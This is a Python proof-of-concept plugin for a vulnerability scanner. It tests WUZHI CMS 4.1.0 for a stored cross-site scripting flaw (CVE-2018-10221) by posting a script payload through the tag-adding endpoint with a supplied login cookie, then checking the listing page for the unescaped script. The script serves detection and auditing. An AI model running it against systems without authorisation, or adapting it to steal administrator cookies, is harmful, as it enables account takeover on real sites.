# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WuZhiCMS_0003_L'  # 平台漏洞编号
    name = 'WUZHI CMS跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '	2018-05-14'  # 漏洞公布时间
    desc = '''
    WUZHI CMS是中国五指（WUZHI）互联科技公司的一套基于PHP和MySQL的开源内容管理系统（CMS）
    WUZHI CMS 4.1.0版本中存在跨站脚本漏洞。远程攻击者可通过向index.php?m=tags&f=index&v=add&&_su=wuzhicms URI发送‘tag’参数利用该漏洞窃取管理员cookies。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-09387'
    cnvd_id = 'CNVD-2018-09387'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10221'  # cve编号
    product = 'WuZhiCMS'  # 漏洞组件名称
    product_version = '4.1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '213ef0b0-d4d4-4dfd-bf14-78e9ee9cf602'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': self.get_option('cookie')
            }
            # post发送一个xss payload
            payload1 = "/index.php?m=tags&f=index&v=add&&_su=wuzhicms&_menuid=95&_submenuid=95&_submenuid=101"
            vul_url1 = arg + payload1
            data = """tag%5Btag%5D=%3Cscript%3Ealert%28233%29%3C%2Fscript%3E&tag%5Btitle%5D=&tag%5Bkeyword%5D=&tag%5Bdesc%5D=&tag%5Bisshow%5D=1&tag%5Blinkageid%5D=0&LK2_1=0&tag%5Bpinyin%5D=&tag%5Bletter%5D=&tag%5Burl%5D=&submit=%E6%8F%90+%E4%BA%A4"""
            response1 = requests.post(vul_url1, headers=headers, data=data)

            # 访问url来验证xss是否成功触发
            payload2 = "/index.php?m=tags&f=index&v=listing&_su=wuzhicms&_menuid=95"
            vul_url2 = arg + payload2
            response2 = requests.get(vul_url2, headers=headers)
            if response2.status_code == 200 and '<script>alert(233)</script></a></td>' in response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
